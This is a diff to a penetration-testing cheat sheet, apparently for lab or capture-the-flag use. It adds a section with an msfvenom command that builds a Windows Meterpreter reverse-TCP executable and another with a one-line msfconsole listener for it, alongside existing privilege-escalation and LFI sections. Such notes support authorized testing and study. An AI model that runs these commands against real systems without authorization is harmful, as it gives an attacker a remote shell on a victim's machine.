@@ -41,6 +41,8 @@
 	- [Meterpreter Windows PrivEsc](#meterpreter-windows-privesc)
 		- [GetSystem](#getsystem)
 		- [Meterpreter shell](#meterpreter-shell)
+		- [Generate tcp reverse shell](#generate-tcp-reverse-shell)
+		- [MSFConsol one line listener](#msfconsol-one-line-listener)
 	- [LFI](#lfi)
 		- [Fuzz](#fuzz)
 		- [View php code](#view-php-code)
@@ -423,6 +425,18 @@ set SESSION 1
 run
 sessions
 sessions -i 2
+```
+
+### Generate tcp reverse shell
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT="1234" -f exe -o rev.exe
+```
+
+### MSFConsol one line listener
+
+```bash
+sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT '1234'; exploit"
 ```
 
 ## LFI
